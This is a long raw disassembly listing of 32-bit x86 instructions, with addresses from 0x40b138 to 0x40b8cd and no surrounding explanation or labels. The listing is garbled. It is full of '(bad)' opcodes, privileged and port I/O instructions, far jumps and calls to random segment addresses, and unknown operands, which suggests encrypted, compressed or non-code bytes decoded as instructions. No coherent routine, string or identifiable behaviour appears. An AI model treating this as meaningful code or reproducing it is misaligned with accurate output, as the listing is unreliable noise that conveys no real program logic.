  40b138:	repz xchg ebx,eax
  40b13a:	adc    dh,BYTE PTR [ebx]
  40b13c:	loope  0x40b0db
  40b13e:	inc    esp
  40b13f:	in     eax,0x48
  40b141:	mov    ah,0x5f
  40b143:	jmp    0x662d:0x929f0a4f
  40b14a:	bound  esp,QWORD PTR [ebp-0xedc1371]
  40b150:	daa    
  40b151:	cdq    
  40b152:	in     eax,dx
  40b153:	call   0x77bd8afe
  40b158:	fidivr DWORD PTR [esi+0x42]
  40b15b:	dec    ebx
  40b15c:	frstor [ebp-0x55]
  40b15f:	pop    edi
  40b160:	loope  0x40b109
  40b162:	push   ds
  40b163:	bswap  edi
  40b165:	outs   dx,BYTE PTR ds:[esi]
  40b166:	xchg   edi,eax
  40b167:	mov    ecx,0x6a4c33fa
  40b16c:	adc    eax,0x9aeff262
  40b171:	and    DWORD PTR [edi-0x63],esi
  40b174:	lds    ebp,FWORD PTR ds:0x9e4b31cf
  40b17a:	fbstp  TBYTE PTR [ecx+0x4092647a]
  40b180:	sbb    BYTE PTR [eax-0x7b699f70],bh
  40b186:	adc    BYTE PTR ds:0xa02ced6f,bl
  40b18c:	cli    
  40b18d:	fchs   
  40b18f:	aas    
  40b190:	out    dx,eax
  40b191:	jnp    0x40b116
  40b193:	mov    WORD PTR [edi-0x6b],?
  40b196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b197:	in     al,dx
  40b198:	xchg   ebp,eax
  40b199:	push   edi
  40b19a:	test   al,0x2a
  40b19c:	aad    0x74
  40b19e:	mov    bh,0x4b
  40b1a0:	ret    0x94dc
  40b1a3:	inc    ebp
  40b1a4:	hlt    
  40b1a5:	mov    ?,esi
  40b1a7:	jbe    0x40b16b
  40b1a9:	xchg   ebp,eax
  40b1aa:	fucomip st,st(5)
  40b1ac:	ret    
  40b1ad:	or     esi,DWORD PTR [edx+0x6b2e8c63]
  40b1b3:	pushf  
  40b1b4:	lock add ebx,edi
  40b1b7:	lock cli 
  40b1b9:	fnstcw WORD PTR [edi+0x35dbe420]
  40b1bf:	(bad)  
  40b1c0:	aaa    
  40b1c1:	pop    ds
  40b1c2:	inc    eax
  40b1c3:	push   0x3c
  40b1c5:	fwait
  40b1c6:	jecxz  0x40b1a8
  40b1c8:	xchg   BYTE PTR [ebp+0x2e],ch
  40b1cb:	jg     0x40b1f5
  40b1cd:	loopne 0x40b1dc
  40b1cf:	ins    BYTE PTR es:[edi],dx
  40b1d0:	adc    eax,0xc83e9be6
  40b1d5:	mov    dl,0x9
  40b1d7:	mov    ecx,0x889840f2
  40b1dc:	clc    
  40b1dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1de:	fsub   QWORD PTR [ecx+0x11a5a5b4]
  40b1e4:	cmp    BYTE PTR [edi],al
  40b1e6:	or     BYTE PTR [eax-0x45ebf61d],bh
  40b1ec:	pop    eax
  40b1ed:	xchg   DWORD PTR [edx+0x54],ebp
  40b1f0:	sti    
  40b1f1:	jns    0x40b1e7
  40b1f3:	(bad)  
  40b1f4:	jp     0xc92da9f9
  40b1fa:	add    BYTE PTR [edi],al
  40b1fc:	pop    es
  40b1fd:	inc    ebp
  40b1fe:	inc    esp
  40b1ff:	xchg   esi,eax
  40b200:	outs   dx,DWORD PTR ds:[esi]
  40b201:	adc    al,0x3d
  40b203:	test   al,0xc
  40b205:	shr    BYTE PTR [esi+0x3d],0x71
  40b209:	mov    cl,0x7
  40b20b:	dec    edx
  40b20c:	mov    eax,ds:0xdd849986
  40b211:	push   edi
  40b212:	cmc    
  40b213:	mov    BYTE PTR [eax],bl
  40b215:	ja     0x40b25f
  40b217:	xchg   ebp,eax
  40b218:	push   0x7f
  40b21a:	pop    esi
  40b21b:	stc    
  40b21c:	mov    WORD PTR [eax],es
  40b21e:	mov    edx,0x218a3a9c
  40b223:	or     ah,cl
  40b225:	ss add bl,bh
  40b228:	push   eax
  40b229:	mov    esi,0xc667fda1
  40b22e:	(bad)
  40b231:	test   al,0xc4
  40b233:	inc    edx
  40b234:	sbb    esp,ebx
  40b236:	jae    0x40b221
  40b238:	adc    al,0x9
  40b23a:	jb     0x40b1f6
  40b23c:	adc    eax,ecx
  40b23e:	jmp    0x31ac:0x8086b196
  40b245:	sbb    bh,BYTE PTR [ebx+0x408ca627]
  40b24b:	test   DWORD PTR [ebx+0x63],edx
  40b24e:	fbld   TBYTE PTR [esi]
  40b250:	xor    al,0xae
  40b252:	test   al,0xd
  40b254:	or     esi,esp
  40b256:	jmp    0x1c9f7413
  40b25b:	loop   0x40b1ea
  40b25d:	in     eax,dx
  40b25e:	or     ecx,ebx
  40b260:	mov    dl,bh
  40b262:	cmc    
  40b263:	mov    esi,0x2e61aa53
  40b268:	mov    dl,0xee
  40b26a:	gs daa 
  40b26c:	loope  0x40b1fa
  40b26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b26f:	dec    esp
  40b270:	out    dx,eax
  40b271:	(bad)  
  40b272:	mov    ch,0x59
  40b274:	daa    
  40b275:	(bad)  
  40b276:	sahf   
  40b277:	adc    dh,BYTE PTR [ecx+0x40]
  40b27a:	sub    dh,0x67
  40b27d:	mov    cl,0x25
  40b27f:	popa   
  40b280:	push   ebp
  40b281:	sub    edx,DWORD PTR [esi-0x80]
  40b284:	sub    DWORD PTR [eax],esp
  40b286:	shr    DWORD PTR [edx+0x47cca94b],cl
  40b28c:	inc    eax
  40b28d:	mov    esp,0x7f65a0d5
  40b292:	cmc    
  40b293:	(bad)  
  40b294:	aad    0x1c
  40b296:	jb     0x40b2a4
  40b298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b299:	arpl   WORD PTR [edi],bx
  40b29b:	fnstcw WORD PTR ss:[esp+edi*8+0x1f6512e2]
  40b2a3:	in     al,dx
  40b2a4:	sbb    BYTE PTR [eax+0x9d66cf0],ah
  40b2aa:	lock adc DWORD PTR [esi+0x1a],edi
  40b2ae:	lods   eax,DWORD PTR ds:[esi]
  40b2af:	shl    DWORD PTR [eax-0x2820c564],1
  40b2b5:	into   
  40b2b6:	xor    ch,al
  40b2b8:	sbb    BYTE PTR [eax+0x1],dl
  40b2bb:	xor    ebx,esp
  40b2bd:	jne    0x40b290
  40b2bf:	sub    bl,BYTE PTR [edx+0x20]
  40b2c2:	lea    esi,[ebx-0x76]
  40b2c5:	xchg   edx,eax
  40b2c6:	mov    dl,0x4
  40b2c8:	xor    edx,esi
  40b2ca:	push   ds
  40b2cb:	push   ds
  40b2cc:	inc    esi
  40b2cd:	xchg   esi,eax
  40b2ce:	ffreep st(0)
  40b2d0:	lea    ecx,[ecx]
  40b2d2:	call   0xe949:0x280a9d7e
  40b2d9:	cli    
  40b2da:	retf   
  40b2db:	rol    BYTE PTR [edi+0x6e],1
  40b2de:	dec    eax
  40b2df:	jno    0x40b321
  40b2e1:	push   edi
  40b2e2:	mov    ecx,ebx
  40b2e4:	dec    esp
  40b2e5:	ficomp DWORD PTR [ecx+0x4d785b11]
  40b2eb:	retf   
  40b2ec:	mul    BYTE PTR [edi+edi*8]
  40b2ef:	gs xchg edi,eax
  40b2f1:	loop   0x40b35a
  40b2f3:	sbb    DWORD PTR [eax+0x45c7446d],ecx
  40b2f9:	xor    al,0x12
  40b2fb:	cs fucom st(2)
  40b2fe:	imul   ecx,esp,0xcbf9a46b
  40b304:	fs push edx
  40b306:	(bad)  
  40b307:	lods   eax,DWORD PTR ds:[esi]
  40b308:	pushf  
  40b309:	push   0x1c
  40b30b:	jne    0x40b30d
  40b30d:	push   esp
  40b30e:	adc    bl,ah
  40b310:	outs   dx,BYTE PTR ds:[esi]
  40b311:	test   BYTE PTR ds:0x52d2f4d0,0xa
  40b318:	in     eax,dx
  40b319:	fwait
  40b31a:	cli    
  40b31b:	inc    edx
  40b31c:	inc    edi
  40b31d:	adc    edi,DWORD PTR [ebp+ebx*1+0x609b0c80]
  40b324:	push   cs
  40b325:	sbb    eax,0xbdda3268
  40b32a:	sti    
  40b32b:	xchg   DWORD PTR [esp+esi*8+0x463e7ea7],esp
  40b332:	cmp    DWORD PTR [edi-0x52103c48],esp
  40b338:	ret    0xc083
  40b33b:	push   ss
  40b33c:	int    0xb
  40b33e:	and    ebp,0xc21a6463
  40b344:	fcmovne st,st(1)
  40b346:	mov    ebx,0xa4790343
  40b34b:	pop    ss
  40b34c:	(bad)
  40b350:	dec    ecx
  40b351:	pop    ebp
  40b352:	jne    0x40b34b
  40b354:	addr16 retf 
  40b356:	mov    eax,DWORD PTR [esi]
  40b358:	jne    0x40b35f
  40b35a:	repnz (bad) 
  40b35c:	cdq    
  40b35d:	or     BYTE PTR [esi+0x39],ah
  40b360:	adc    ah,BYTE PTR [esp+esi*4-0x37ef943e]
  40b367:	jbe    0x40b373
  40b369:	lods   eax,DWORD PTR ds:[esi]
  40b36a:	inc    ebp
  40b36b:	into   
  40b36c:	sbb    eax,0x1ca867c1
  40b371:	sbb    al,0xc1
  40b373:	mov    cl,dh
  40b375:	mov    ds:0xef067fc8,eax
  40b37a:	jno    0x40b330
  40b37c:	lea    edx,[edx-0x61]
  40b37f:	sbb    eax,0xeeea9912
  40b384:	pusha  
  40b385:	jecxz  0x40b35d
  40b387:	pop    ax
  40b389:	sti    
  40b38a:	ret    0x4622
  40b38d:	inc    ebp
  40b38e:	pop    esp
  40b38f:	cmp    DWORD PTR [ebp-0x35f15d1b],ecx
  40b395:	add    BYTE PTR [esi+edi*1],0xc3
  40b399:	xor    al,0xd4
  40b39b:	enter  0xd97c,0xcf
  40b39f:	cmp    DWORD PTR [esi],ecx
  40b3a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3a2:	in     eax,dx
  40b3a3:	jo     0x40b3bf
  40b3a5:	bnd ret 
  40b3a7:	retf   
  40b3a8:	add    al,0xa8
  40b3aa:	xor    DWORD PTR [ecx],eax
  40b3ac:	jge    0x40b37e
  40b3ae:	imul   ecx,DWORD PTR [ebx],0xf657831e
  40b3b4:	cmc    
  40b3b5:	rcr    ebx,0xa5
  40b3b8:	cs push esp
  40b3ba:	mov    eax,0xbd9dc88
  40b3bf:	repz retf 0xb27e
  40b3c3:	bound  edx,QWORD PTR [esi-0xa]
  40b3c6:	add    dh,BYTE PTR [edi]
  40b3c8:	push   cs
  40b3c9:	jge    0x42706552
  40b3cf:	(bad)  
  40b3d1:	pusha  
  40b3d2:	and    edx,DWORD PTR [edi+0x39]
  40b3d5:	pop    esp
  40b3d6:	fwait
  40b3d7:	(bad)  
  40b3d8:	xchg   edx,eax
  40b3d9:	mov    bh,0x5
  40b3db:	dec    eax
  40b3dc:	cli    
  40b3dd:	inc    esi
  40b3de:	xchg   edi,eax
  40b3df:	jl     0x40b441
  40b3e1:	popa   
  40b3e2:	jmp    0x40b455
  40b3e4:	jb     0x40b417
  40b3e6:	inc    edx
  40b3e7:	icebp  
  40b3e8:	shr    BYTE PTR [eax+ebx*8],cl
  40b3eb:	mov    ecx,0x3801bc84
  40b3f0:	into   
  40b3f1:	inc    esi
  40b3f2:	and    ebp,DWORD PTR [ebp-0x5e]
  40b3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3f6:	and    dh,BYTE PTR [eax-0x53]
  40b3f9:	adc    ah,dh
  40b3fb:	jp     0x40b439
  40b3fd:	cmp    edi,DWORD PTR [ecx-0x63]
  40b400:	rcl    BYTE PTR [edi-0x4eb024f],0xbf
  40b407:	lods   eax,DWORD PTR ds:[esi]
  40b408:	jnp    0x40b452
  40b40a:	dec    ebp
  40b40b:	jnp    0x40b3b0
  40b40d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b40e:	mov    ah,0x23
  40b410:	call   0x5e74:0xb834b493
  40b417:	inc    eax
  40b418:	mov    ds:0xb794dbd5,eax
  40b41d:	shl    BYTE PTR [esp+esi*2+0x6bd6cdfa],1
  40b424:	andnps xmm6,XMMWORD PTR [edx+esi*8]
  40b428:	xchg   ecx,eax
  40b429:	lods   al,BYTE PTR ds:[esi]
  40b42a:	inc    edx
  40b42b:	mov    dh,0xb
  40b42d:	xchg   BYTE PTR [esi+0xb81f616],dh
  40b433:	and    eax,0x76c950f9
  40b438:	push   es
  40b439:	lods   al,BYTE PTR ds:[esi]
  40b43a:	sbb    DWORD PTR [ecx+0x38bd6a99],esp
  40b440:	data16 jnp 0x40b497
  40b443:	push   ds
  40b444:	(bad)  
  40b445:	jmp    0x64f8410e
  40b44a:	and    eax,ebx
  40b44c:	das    
  40b44d:	push   edi
  40b44e:	ss in  al,0xc1
  40b451:	mov    eax,ds:0x8ac5bdbc
  40b456:	add    ecx,eax
  40b458:	retf   0x3a40
  40b45b:	rcl    BYTE PTR [edx+0x5b401b6],0xb
  40b462:	or     ecx,ebx
  40b464:	into   
  40b465:	mov    ah,0x85
  40b467:	adc    DWORD PTR [edx-0x4d065d3f],ecx
  40b46d:	icebp  
  40b46e:	aas    
  40b46f:	data16 mov al,0x8a
  40b472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b473:	repz push edx
  40b475:	(bad)  
  40b476:	cmc    
  40b477:	adc    al,0x79
  40b479:	gs pusha 
  40b47b:	push   cs
  40b47c:	mov    dl,0x12
  40b47e:	shr    DWORD PTR [edx],cl
  40b480:	cld    
  40b481:	or     DWORD PTR [edi],ebp
  40b483:	inc    edx
  40b484:	pop    ebx
  40b485:	rcr    DWORD PTR [edi-0x4c3576ca],1
  40b48b:	cmp    eax,0x368d3e76
  40b490:	push   ss
  40b491:	pop    esp
  40b492:	mov    cl,0x81
  40b494:	adc    ebx,edx
  40b496:	je     0x40b49e
  40b498:	mov    eax,0x27654554
  40b49d:	mov    edx,0x79bb8082
  40b4a2:	mov    ch,0x6c
  40b4a4:	pushf  
  40b4a5:	xor    al,0x39
  40b4a7:	(bad)  
  40b4a8:	in     al,0xc8
  40b4aa:	add    bh,BYTE PTR [edx-0x57bf3d09]
  40b4b0:	stc    
  40b4b1:	sbb    ah,BYTE PTR [ecx-0x44]
  40b4b4:	(bad)  
  40b4b5:	mov    eax,ds:0x373166f4
  40b4ba:	in     eax,dx
  40b4bb:	mov    ecx,0xe74873e9
  40b4c0:	push   ebp
  40b4c1:	call   0x1f1fa248
  40b4c6:	dec    edx
  40b4c7:	adc    eax,0x96602692
  40b4cc:	push   ebp
  40b4cd:	jl     0x40b507
  40b4cf:	xor    dl,dl
  40b4d1:	mov    dl,0x48
  40b4d3:	(bad)  
  40b4d4:	mul    esi
  40b4d6:	shl    DWORD PTR [esi+0x63],0xae
  40b4da:	adc    BYTE PTR [esi-0x6d],bh
  40b4dd:	xor    ebp,DWORD PTR [ecx+0x7c56e695]
  40b4e3:	jb     0x40b4b8
  40b4e5:	push   0xcfe5d7ca
  40b4ea:	test   eax,0x4fe4ca74
  40b4ef:	pop    ecx
  40b4f0:	test   dh,cl
  40b4f2:	sub    DWORD PTR [edx-0xc66ee29],esp
  40b4f8:	pop    edx
  40b4f9:	and    al,0x8d
  40b4fb:	pop    es
  40b4fc:	dec    esi
  40b4fd:	stos   DWORD PTR es:[edi],eax
  40b4fe:	push   edx
  40b4ff:	aaa    
  40b500:	inc    edx
  40b501:	mov    eax,0xc5a12156
  40b506:	enter  0xa409,0x3a
  40b50a:	dec    ebx
  40b50b:	loop   0x40b584
  40b50d:	dec    ebp
  40b50e:	imul   ebp,DWORD PTR [edi+eax*4],0x4
  40b512:	sbb    DWORD PTR [eax-0x2ae5eff5],esp
  40b518:	or     esp,edx
  40b51a:	cdq    
  40b51b:	pop    edx
  40b51c:	jle    0x40b56e
  40b51e:	xor    ebx,ecx
  40b520:	fcomp  DWORD PTR [eax*2-0x77217249]
  40b527:	or     al,0x58
  40b529:	jle    0x40b54a
  40b52b:	sub    DWORD PTR [eax],esp
  40b52d:	jo     0x40b54e
  40b52f:	scas   al,BYTE PTR es:[edi]
  40b530:	ins    DWORD PTR es:[edi],dx
  40b531:	push   ss
  40b532:	aas    
  40b533:	fidivr DWORD PTR [esi]
  40b535:	das    
  40b536:	push   0x7a
  40b538:	adc    eax,0x8d565c85
  40b53d:	lods   al,BYTE PTR ds:[esi]
  40b53f:	or     DWORD PTR [edx-0x52802e6d],0x79c2fda2
  40b549:	loope  0x40b598
  40b54b:	outs   dx,DWORD PTR ds:[esi]
  40b54c:	rol    BYTE PTR [ecx],cl
  40b54e:	fisub  WORD PTR [ebp+0x62]
  40b551:	add    bh,0xc1
  40b554:	dec    eax
  40b555:	sbb    DWORD PTR [edx+ebp*1],ebp
  40b558:	pop    eax
  40b559:	fwait
  40b55a:	(bad)  
  40b55b:	xchg   esp,eax
  40b55c:	repz or DWORD PTR [ecx],edi
  40b55f:	mov    ebx,0x330b2184
  40b564:	pop    eax
  40b565:	push   0xa228ebce
  40b56a:	pop    edi
  40b56b:	sub    eax,0xed09291e
  40b570:	scas   eax,DWORD PTR es:[edi]
  40b571:	lds    ebx,FWORD PTR [ebx]
  40b573:	push   0xff114bb0
  40b578:	push   ds
  40b579:	xor    al,0x4
  40b57b:	jnp    0x40b57e
  40b57d:	cmc    
  40b57e:	test   eax,0xf198ddef
  40b583:	sar    DWORD PTR [ecx-0x59e44fda],cl
  40b589:	ret    
  40b58a:	pop    ss
  40b58b:	mov    ah,0x32
  40b58d:	je     0x40b5fa
  40b58f:	retf   0xd0d7
  40b592:	mov    ebx,0xe74217a9
  40b597:	outs   dx,DWORD PTR ds:[esi]
  40b598:	push   es
  40b599:	mov    esi,DWORD PTR [eax]
  40b59b:	(bad)  
  40b59c:	sbb    DWORD PTR [eax+ebp*4-0x2ab145f9],edi
  40b5a3:	pusha  
  40b5a4:	in     al,0x9f
  40b5a6:	cmp    eax,0xcb318626
  40b5ab:	sub    al,0x4f
  40b5ad:	js     0x40b600
  40b5af:	sbb    eax,0xfdf10b8b
  40b5b4:	sbb    bh,dl
  40b5b6:	mov    cl,0x98
  40b5b8:	xchg   DWORD PTR [edi+0x1708a227],ebp
  40b5be:	cmp    eax,0x3f1f320e
  40b5c3:	popa   
  40b5c4:	sub    eax,0xac047de2
  40b5c9:	mov    ch,0x33
  40b5cb:	mov    edi,0xfdfab72a
  40b5d0:	cs ret 0x8385
  40b5d4:	ss cdq 
  40b5d6:	jecxz  0x40b5cb
  40b5d8:	ds iret 
  40b5da:	push   ebp
  40b5db:	add    BYTE PTR [esi+0x69],0x38
  40b5df:	push   ss
  40b5e0:	adc    esp,DWORD PTR [esi+0x1]
  40b5e3:	xchg   esi,eax
  40b5e4:	mov    ah,dl
  40b5e6:	ds into 
  40b5e8:	mov    ah,dl
  40b5ea:	cdq    
  40b5eb:	lods   eax,DWORD PTR ds:[esi]
  40b5ec:	jle    0x40b5ed
  40b5ee:	xchg   esi,eax
  40b5ef:	inc    eax
  40b5f0:	stc    
  40b5f1:	push   ss
  40b5f2:	(bad)  
  40b5f3:	or     BYTE PTR [ebp-0x69ce9b1d],ch
  40b5f9:	xor    ecx,DWORD PTR [eax+0x2a]
  40b5fc:	jle    0x40b5f9
  40b5fe:	add    edx,DWORD PTR [eax-0x3a9abc8e]
  40b604:	mov    eax,ds:0xee62911b
  40b609:	outs   dx,BYTE PTR ds:[esi]
  40b60a:	and    al,0x57
  40b60c:	inc    edx
  40b60d:	cmp    BYTE PTR [eax+0x51],dh
  40b610:	and    DWORD PTR [edi],ebx
  40b612:	xor    edx,DWORD PTR [ecx]
  40b614:	addr16 out dx,eax
  40b616:	mov    bl,0x9a
  40b618:	sub    BYTE PTR [esp+esi*1],dl
  40b61b:	les    edx,FWORD PTR [edi-0x1b]
  40b61e:	jmp    0x2078:0x6ffcf8d1
  40b625:	stos   DWORD PTR es:[edi],eax
  40b626:	call   0x94008318
  40b62b:	inc    esp
  40b62c:	and    DWORD PTR [ebp+0x4c710b8b],0x2b
  40b633:	ds das 
  40b635:	add    ecx,DWORD PTR [ecx+0x78f9933a]
  40b63b:	xchg   ebp,eax
  40b63c:	jno    0x40b6b0
  40b63e:	adc    DWORD PTR ss:[esi-0x6ec73629],esi
  40b645:	adc    eax,0xdbe589af
  40b64a:	and    edx,esp
  40b64c:	fs inc edx
  40b64e:	dec    ebp
  40b64f:	jnp    0x40b6b4
  40b651:	mov    esi,0x5ee3dc55
  40b656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b657:	add    al,0x88
  40b659:	loope  0x40b60e
  40b65b:	test   al,0x47
  40b65d:	(bad)  
  40b65e:	stos   BYTE PTR es:[edi],al
  40b65f:	add    al,0x68
  40b661:	(bad)  
  40b663:	mov    ebp,0x59177e63
  40b668:	retf   0xfd1a
  40b66b:	iret   
  40b66c:	or     DWORD PTR ds:0xbc0860bc,0x1a
  40b673:	sub    esp,DWORD PTR [ebp+0x1da64306]
  40b679:	out    dx,al
  40b67a:	(bad)  
  40b67c:	push   ecx
  40b67e:	jecxz  0x40b6fa
  40b680:	aaa    
  40b681:	ror    DWORD PTR [edx-0x35],1
  40b684:	xchg   esp,eax
  40b685:	mov    edx,0x6e91eabc
  40b68a:	fmul   QWORD PTR [esi+0x37259ea0]
  40b690:	pusha  
  40b691:	add    DWORD PTR [ecx-0x2ab7a5fd],0x8
  40b698:	pop    ebx
  40b699:	or     ch,ah
  40b69b:	int3   
  40b69c:	sbb    ch,bl
  40b69e:	nop
  40b69f:	icebp  
  40b6a0:	push   cs
  40b6a1:	ja     0x40b65a
  40b6a3:	out    0x3b,al
  40b6a5:	dec    edi
  40b6a6:	pop    eax
  40b6a7:	jo     0x40b702
  40b6a9:	or     esp,eax
  40b6ab:	dec    ecx
  40b6ac:	mov    edi,0x8fe99601
  40b6b1:	fwait
  40b6b2:	test   al,0x97
  40b6b4:	stc    
  40b6b5:	jne    0x40b702
  40b6b7:	popa   
  40b6b8:	test   BYTE PTR [edx-0x20],dl
  40b6bb:	pop    ss
  40b6bc:	add    BYTE PTR [ebx-0x2b],ch
  40b6bf:	push   ebp
  40b6c0:	je     0x40b643
  40b6c2:	xor    edx,ecx
  40b6c4:	mov    eax,0xacf14089
  40b6c9:	lea    esi,[edi]
  40b6cb:	(bad)  
  40b6cc:	loopne 0x40b74b
  40b6ce:	enter  0x4ef4,0x57
  40b6d2:	pop    es
  40b6d3:	or     al,0x8e
  40b6d5:	aaa    
  40b6d6:	or     BYTE PTR ds:0x72f428c7,dh
  40b6dc:	retf   0xa836
  40b6df:	add    BYTE PTR [ecx-0x59929756],dl
  40b6e5:	arpl   WORD PTR [esi+0x0],si
  40b6e8:	xlat   BYTE PTR ds:[ebx]
  40b6e9:	adc    al,0x1d
  40b6eb:	add    al,0x59
  40b6ed:	sub    al,0x74
  40b6ef:	xor    eax,0x45d33917
  40b6f4:	push   ebp
  40b6f5:	mov    ah,0x85
  40b6f7:	ret    0x6bac
  40b6fa:	and    edi,DWORD PTR [edi]
  40b6fc:	aam    0xc7
  40b6fe:	mov    edx,0xc3a360c3
  40b703:	mov    esp,0xbdcb71e
  40b708:	stos   DWORD PTR es:[edi],eax
  40b709:	push   esp
  40b70a:	sub    ch,BYTE PTR [eax]
  40b70c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b70d:	pop    ss
  40b70e:	mov    ds:0x48484abf,al
  40b713:	idiv   DWORD PTR [edx-0x32a636ba]
  40b719:	retf   0x4976
  40b71c:	mov    ch,0x6b
  40b71e:	jle    0x40b6a2
  40b720:	jae    0x40b6e5
  40b722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b723:	ds jb  0x40b773
  40b726:	fisttp DWORD PTR [ecx-0x1ffeef74]
  40b72c:	pop    es
  40b72d:	cli    
  40b72e:	sub    ecx,DWORD PTR [edi+ecx*4+0x24]
  40b732:	pop    edi
  40b733:	fld    DWORD PTR [edi+0x4a]
  40b736:	fisttp WORD PTR [eax]
  40b738:	fsub   QWORD PTR [edi-0x1a]
  40b73b:	fstp   DWORD PTR [edi]
  40b73d:	xchg   BYTE PTR [esi],dh
  40b73f:	cmp    cl,BYTE PTR [eax+0x43]
  40b742:	jbe    0x40b7b5
  40b744:	rcr    al,0x77
  40b747:	jnp    0x40b7b2
  40b749:	jae    0x40b6e5
  40b74b:	dec    edi
  40b74c:	pavgb  mm0,QWORD PTR [edx-0x7455f611]
  40b753:	or     bh,0xf7
  40b756:	xor    esp,DWORD PTR [eax+0x78]
  40b759:	xor    ah,bh
  40b75b:	out    dx,al
  40b75c:	es je  0x40b79a
  40b75f:	mov    ecx,0x631ba626
  40b764:	mov    ch,0x2e
  40b766:	and    eax,0xea6cdbe2
  40b76b:	jp     0x40b7e5
  40b76d:	test   DWORD PTR [edi-0x4980f1bf],ecx
  40b773:	cmp    eax,0x41c3d48b
  40b778:	scas   eax,DWORD PTR es:[edi]
  40b779:	rcl    DWORD PTR [edi-0x31],cl
  40b77c:	test   eax,0x49f744c
  40b781:	inc    edx
  40b782:	mov    dl,0x37
  40b784:	inc    edx
  40b785:	xor    bl,BYTE PTR [ecx-0x47]
  40b788:	xchg   ecx,eax
  40b789:	mov    ah,0x62
  40b78b:	jge    0x40b7c8
  40b78d:	jp     0x40b7a1
  40b78f:	sub    edi,DWORD PTR [ecx-0x2077ccf9]
  40b795:	test   al,0x11
  40b797:	(bad)  
  40b798:	cdq    
  40b799:	sbb    eax,0x501869f3
  40b79e:	stc    
  40b79f:	in     al,dx
  40b7a0:	push   0xffffffc4
  40b7a2:	cli    
  40b7a3:	dec    ebp
  40b7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a5:	adc    al,0x77
  40b7a8:	or     bh,ah
  40b7aa:	add    eax,0x80d45207
  40b7af:	or     DWORD PTR [esp+ecx*1+0x21],eax
  40b7b3:	hlt    
  40b7b4:	jl     0x40b776
  40b7b6:	inc    eax
  40b7b7:	js     0x40b75c
  40b7b9:	inc    esp
  40b7ba:	sahf   
  40b7bb:	push   ebx
  40b7bc:	sbb    al,0xf5
  40b7be:	push   cs
  40b7bf:	or     dh,BYTE PTR [ebx-0x31]
  40b7c2:	call   0x1f29b66a
  40b7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7c8:	xor    eax,0x37d75332
  40b7cd:	mov    al,0xc6
  40b7cf:	push   es
  40b7d0:	repz das 
  40b7d2:	push   esp
  40b7d3:	push   edi
  40b7d4:	jns    0x40b775
  40b7d6:	jmp    0x40b826
  40b7d8:	icebp  
  40b7d9:	xchg   BYTE PTR [ebp+0x423e6238],ch
  40b7df:	div    BYTE PTR [edi+0x4234d173]
  40b7e5:	rol    DWORD PTR [edx+ebp*8+0x5cce22f2],0x54
  40b7ed:	fcomp  DWORD PTR [edx+0x3442dd1f]
  40b7f3:	mov    cl,0x3c
  40b7f5:	jnp    0x40b806
  40b7f7:	dec    ebx
  40b7f8:	das    
  40b7f9:	sub    eax,0xe82f794f
  40b7fe:	jnp    0x40b7a5
  40b800:	xor    eax,0xff8feec0
  40b805:	lahf   
  40b806:	fild   WORD PTR [edx+edx*2+0x5a]
  40b80a:	mov    eax,0x941704a1
  40b80f:	xor    DWORD PTR [ebx+ecx*4-0x3404247],eax
  40b816:	punpckhbw mm4,QWORD PTR [esi]
  40b819:	mov    fs,ebp
  40b81b:	fimul  DWORD PTR [ecx+0x7d]
  40b81e:	clc    
  40b81f:	push   eax
  40b820:	ret    
  40b821:	mov    cs,WORD PTR [edi-0x1f7ab240]
  40b827:	mov    bl,0x2a
  40b829:	cmp    al,0x95
  40b82b:	aaa    
  40b82c:	xchg   ecx,eax
  40b82d:	xor    ebp,DWORD PTR [eax]
  40b82f:	push   edi
  40b830:	ficomp WORD PTR [ecx+0x2a]
  40b833:	call   0xd70a2475
  40b838:	sti    
  40b839:	pop    edx
  40b83a:	int    0xff
  40b83c:	div    DWORD PTR [ebp-0x3b]
  40b83f:	pop    ecx
  40b840:	and    eax,0x2bbb467b
  40b845:	mov    eax,0xcc2a21a9
  40b84a:	push   edx
  40b84b:	repnz in eax,0xe2
  40b84e:	or     DWORD PTR [eax],0x2f55c2a1
  40b854:	pop    ecx
  40b855:	out    0xf4,eax
  40b857:	call   0x2e3:0xfd880512
  40b85e:	test   DWORD PTR [esi+0x60],esp
  40b861:	icebp  
  40b862:	inc    ebx
  40b863:	push   ebx
  40b864:	sub    edx,DWORD PTR [edx+0x1d]
  40b867:	add    eax,edi
  40b869:	adc    DWORD PTR [ebp+0x2603d068],eax
  40b86f:	jle    0x40b80f
  40b871:	adc    DWORD PTR [esi-0x55b501bb],0x71
  40b878:	imul   ebp,DWORD PTR [ebx+0x63],0xea740d21
  40b87f:	(bad)  
  40b880:	cmp    ebp,DWORD PTR [esi]
  40b882:	ret    
  40b883:	or     DWORD PTR [ebp+0x223c5ede],esp
  40b889:	out    0xbd,eax
  40b88b:	mov    bh,0x19
  40b88d:	(bad)  
  40b88e:	imul   cl
  40b890:	xchg   edi,eax
  40b891:	mov    ebx,0x5d16bf07
  40b896:	push   0x3c
  40b898:	sbb    ah,BYTE PTR [ecx-0xe]
  40b89b:	sub    bl,ch
  40b89d:	add    bh,dh
  40b89f:	xchg   BYTE PTR [edx],dl
  40b8a1:	fisubr WORD PTR [edx-0x53]
  40b8a4:	sbb    eax,DWORD PTR [eax+eax*8-0x3b9ff5a1]
  40b8ab:	and    esi,DWORD PTR [edi+0x494803ca]
  40b8b1:	or     DWORD PTR [ebp+eiz*1+0x13c43af4],esi
  40b8b8:	push   0x79f5c442
  40b8bd:	out    dx,eax
  40b8be:	imul   ebp,DWORD PTR [ebx+0x55],0xfffffffa
  40b8c2:	imul   ecx,DWORD PTR [esi],0x25
  40b8c5:	xchg   esi,eax
  40b8c6:	repz mov ds:0xfc514e64,al
  40b8cc:	(bad)  
  40b8cd:	das    
